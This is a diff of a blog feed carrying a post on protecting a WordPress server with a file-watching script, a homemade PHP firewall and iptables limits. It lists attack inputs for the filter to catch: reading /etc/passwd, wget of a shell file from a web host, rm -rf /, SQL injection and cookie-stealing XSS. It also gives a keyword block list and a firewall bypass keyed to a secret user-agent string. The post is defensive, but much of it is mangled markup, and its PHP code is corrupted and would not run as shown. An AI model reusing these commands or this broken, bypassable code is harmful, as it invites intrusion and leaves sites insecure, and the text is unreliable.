+</span><span class='line'><span class="n">chmod</span> <span class="mi">755</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">start</span><span class="o">-</span><span class="n">stop</span><span class="o">-</span><span class="n">daemon</span>
+</span><span class='line'><span class="n">start</span><span class="o">-</span><span class="n">stop</span><span class="o">-</span><span class="n">daemon</span> <span class="o">-</span><span class="n">V</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">output</span><span class="p">:</span> <span class="n">start</span><span class="o">-</span><span class="n">stop</span><span class="o">-</span><span class="n">daemon</span> <span class="mf">1.9</span><span class="o">.</span><span class="mi">18</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">And</span> <span class="n">then</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">cd</span> <span class="o">..</span>
+</span><span class='line'><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="n">daemon</span>
+</span><span class='line'><span class="n">rm</span> <span class="o">-</span><span class="n">rf</span> <span class="n">service</span><span class="o">.</span><span class="n">zip</span>
+</span><span class='line'><span class="n">mv</span> <span class="n">zeroday</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="o">.</span><span class="n">d</span><span class="o">/</span>
+</span><span class='line'><span class="n">chmod</span> <span class="mi">755</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">init</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="n">zeroday</span>
+</span><span class='line'><span class="n">mv</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;.</span><span class="n">py</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span>
+</span><span class='line'><span class="n">cd</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span>
+</span><span class='line'><span class="n">chmod</span> <span class="mi">755</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;.</span><span class="n">py</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">And</span> <span class="n">now</span> <span class="n">run</span> <span class="ow">and</span> <span class="n">edit</span> <span class="n">md5</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">bash</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">nano</span> <span class="n">md5</span><span class="o">.</span><span class="n">py</span> <span class="o">=&gt;</span> <span class="n">replace</span> <span class="n">public_html</span> <span class="n">directory</span> <span class="ow">in</span> <span class="n">line</span> <span class="mi">13</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">[</span><span class="n">root</span><span class="nd">@localhost</span> <span class="o">~</span><span class="p">]</span><span class="c"># python md5.py     =&gt; output:</span>
+</span><span class='line'><span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</span><span class='line'><span class="n">Stopping</span> <span class="n">httpd</span><span class="p">:</span>                                            <span class="p">[</span>  <span class="n">OK</span>  <span class="p">]</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">All</span> <span class="n">Dead</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Killed</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">&amp;</span><span class="n">mdash</span><span class="p">;</span><span class="o">-&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">nano</span> <span class="n">md5</span><span class="o">.</span><span class="n">py</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">code</span><span class="o">&gt;</span>
+</span><span class='line'><span class="n">Go</span> <span class="n">to</span> <span class="n">line</span> <span class="mi">52</span> <span class="ow">and</span> <span class="n">replace</span> <span class="n">this</span> <span class="n">md5</span> <span class="k">with</span> <span class="n">md5</span> <span class="n">inside</span> <span class="nb">file</span> <span class="p">,</span><span class="n">And</span> <span class="k">try</span> <span class="n">run</span> <span class="n">it</span> <span class="n">again</span><span class="o">.</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;</span><span class="n">bash</span>
+</span><span class='line'><span class="p">[</span><span class="n">root</span><span class="nd">@localhost</span> <span class="o">~</span><span class="p">]</span><span class="c"># python md5.py</span>
+</span><span class='line'><span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</span><span class='line'><span class="k">pass</span> <span class="p">,</span> <span class="n">md5</span><span class="p">:</span> <span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</span><span class='line'><span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</span><span class='line'><span class="k">pass</span> <span class="p">,</span> <span class="n">md5</span><span class="p">:</span> <span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</span><span class='line'><span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</span><span class='line'><span class="k">pass</span> <span class="p">,</span> <span class="n">md5</span><span class="p">:</span> <span class="n">d41d8cd98f00b204e9800998ecf8427e</span>
+</span></code></pre></td></tr></table></div></figure>
+Next step you have to replace php file link address in out.py at line 8. And now it&rsquo;s working now.</p>
+
+<p>And now about that php file , you should replace your primary word to your site name or title and then upload it on other host [you can also use free hosting as i said before] and now your service working well.
+So until now your server files if change , this robot will stop Apache webserver so it mean no one cannot upload any badware [ shell scripts or anything ] on your website or deface your website or if any ddos attack or crashing happen it will ban attacker(s) IP and restart Apache webserver. this robot need to develop for working more easy and if I get more free time I&rsquo;ll improve this and make it easy to work.
+but now , about other 0day Vulnerabilities on wordpress or plugins. so we need filter something on GET and POST Requests. If you think I want start listing words same
+<code>html
+union
+select
+wget
+alert(
+wget
+curl
+information
+and bla bla
+</code>
+your are so wrong because it&rsquo;s so ridicules and it bypass easy so the best way it&rsquo;s filter these characters</p>
+
+<pre><code class="html">!@#$%^&amp;*()_+=-\|}{[]:"?&gt;&lt;;'/.,
+</code></pre>
+
+<p>if we filter these characters most vulnerabilities will disable
+Examples:
+RCE:
+<code>php
+cat /etc/passwd      =&gt;  /
+ls -la      =&gt; -
+echo 1 &gt; 1  =&gt;   &gt;
+wget http://z3r0d4y.com/shell.txt   =&gt; :// . .
+curl z3r0d4y.com    =&gt; .
+rm -rf /    =&gt; - /
+rm *    =&gt; *
+</code>
+SQL:
+<code>php
+Union Select 1,2,3,4,5 from admin--     =&gt;  , -
+hex( , unhex( , grpup_contact( , bla bla    =&gt; ( _
+</code>
+XSS:
+<code>php
+alert(      =&gt; (
+&lt;img        =&gt; &lt;
+scr=        =&gt; =
+document.cookie     =&gt; .
+</code></p>
+
+<p>LFI:
+<code>php
+/etc/passwd     =&gt; /
+../     =&gt; . /
+</code>
+and more &hellip; See everything filtered by a simple way but you must add some exceptions! a method for handle exception is put wp-comments-post.php in white list and [we know it&rsquo;s not vulnerable] and users want to send comment so it must be in white list and deny all others but we shouln&rsquo;t filter admin requests in wordpress [for posts and other js and &hellip; requests] so we generate a random md5 or any primary words and we put in php WAF and use Firefox user agent switcher to add a user agent for managing your blog, so now just you have a primary key on your server and just you can send any request so handle it on wp-config.php enjoy your new mini POWERFUL WAF.
+<code>``php waf.php https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/waf.php
+&lt;?php
+$list_exceptions = array("/wp-comments-post.php");
+$list_deny = array("</code>&ldquo;,
+&rdquo;~&ldquo;,
+&rdquo;!&ldquo;,
+&rdquo;@&ldquo;,
+&rdquo;#&ldquo;,
+&rdquo;$&ldquo;,
+&rdquo;%&ldquo;,
+&rdquo;^&ldquo;,
+&rdquo;&amp;&ldquo;,
+&rdquo;*&ldquo;,
+&rdquo;(&ldquo;,
+&rdquo;)&ldquo;,
+&rdquo;-&ldquo;,
+&rdquo;<em>&ldquo;,
+&rdquo;+&ldquo;,
+&rdquo; &ldquo;,
+&rdquo;[&ldquo;,
+&rdquo;]&ldquo;,
+&rdquo;{&ldquo;,
+&rdquo;}&ldquo;,
+&rdquo;\&ldquo;,
+&rdquo;|&ldquo;,
+&rdquo;;&ldquo;,
+&rdquo;:&ldquo;,
+&rdquo;&lsquo;&ldquo;,
+&rsquo;&rdquo;&lsquo;,
+&ldquo;&lt;&rdquo;,
+&ldquo;>&rdquo;,
+&ldquo;?&rdquo;,
+&ldquo;/&rdquo;,
+&ldquo;,&rdquo;,
+&ldquo;.&rdquo;,
+);
+$detect = 0;
+$get = 0;
+$post = 0;
+$protocol = strpos(strtolower($</em>SERVER[&#8216;SERVER_PROTOCOL&rsquo;]),&lsquo;https&rsquo;) === FALSE ? &lsquo;http&rsquo; : &lsquo;https&rsquo;;
+$host = $<em>SERVER[&lsquo;HTTP_HOST&rsquo;];
+$script = $</em>SERVER[&lsquo;SCRIPT_NAME&rsquo;];
+$params = $<em>SERVER[&lsquo;QUERY_STRING&rsquo;];
+$currentUrl = $protocol . &lsquo;://&rsquo; . $host . $script . &lsquo;?&rsquo; . $params;
+$script = urldecode($script);
+$script = urldecode($script);
+$script = urldecode($script);
+$script = urldecode($script);
+$params = urldecode($params);
+$params = urldecode($params);
+$params = urldecode($params);
+$params = urldecode($params);
+$agent = $</em>SERVER[&lsquo;HTTP_USER_AGENT&rsquo;];</p>
+
+<p>for($i=0; $i&lt;count($list_deny); $i++){
+    if(strpos($params,$list_deny[$i]) !== false){
+        $get = 1;</p>
+
+<pre><code>    for($j=0; $j&lt;count($list_exceptions); $j++){
+        if(strpos($script,$list_exceptions[$j]) !== false){
+            $get = 0;
+        }
+    }
+    if($get == 1){
+            if(strpos($agent,'b00c52cac042640c440db9684a59ae36') == false){
+            $_GET = str_replace($list_deny[$i],"***[firewall]***",$_GET);
+            }
+    }
+}
+</code></pre>
+
+<p>}
+foreach($<em>POST as $key => $value){
+    $key = strtolower($key);
+    $value = strtolower($value);
+    for($i=0; $i&lt;count($list_deny); $i++){
+        if(strpos($value,$list_deny[$i]) !== false){
+            $post = 1;
+            for($j=0; $j&lt;count($list_exceptions); $j++){
+                if(strpos($script,$list_exceptions[$j]) !== false){
+                    $post = 0;
+                }
+            }
+            if($post == 1){
+                if(strpos($agent,&lsquo;b00c52cac042640c440db9684a59ae36&rsquo;) == false){
+                $</em>POST = str_replace($list_deny[$i],&ldquo;<strong><em>[firewall]</em></strong>&rdquo;,$_POST);
+                }
+            }
+            }
+    }
+    }
+?></p>
+
+<p>&#8220;`
+Note: If you want use this WAF on other CMS you must change white list and include it on cms config file.(config files usually included on all files in CMS that&rsquo;s why we do that)</p>
+
+<p>And last thing about other services same cpanel,ssh and &hellip; , you must set IP limits with iptables for all of their ports number OR stop their services if you don&rsquo;t need these, if you want to stop services don&rsquo;t forgot for start them again you need CONSOLE ACCESS and if you don&rsquo;t have console access , don&rsquo;t disable them. disabling services protect you from 0Day Vulnerabilities that they are not public yet.</p>
+
+<p>until now we protected our website from 0Day vulnerabilities and protected our server with a simple ways for ddos and deface or uploading.
+We didn&rsquo;t config any IDS or IPS professional mode But be sure with doing these on your server be sure you protected so much</p>
+
+<p>But at last if you are same me and very stressful , get a domain , install octopress blogging on your system and upload your site on <a href="http://pages.github.com/">github pages</a>, be safe more than any VPS. But It&rsquo;s not php and mysql hosting so it&rsquo;s limit but prefect for simple blogging.</p>
+
+<p>Reference :
+<br>1- Sites that i shared URLs
+<br>2- Bash Code on <a href="http://google.com">Google</a>
+<br>3- <a href="http://z3r0d4y.com">ZeroDay Cyber Research</a></p>
+
+<p><a href="mailto:Ali[dot]Razmjoo1994[at]Gmail[at]Com">Ali Razmjoo</a></p>
+]]></content>
+  </entry>
+  
+</feed>
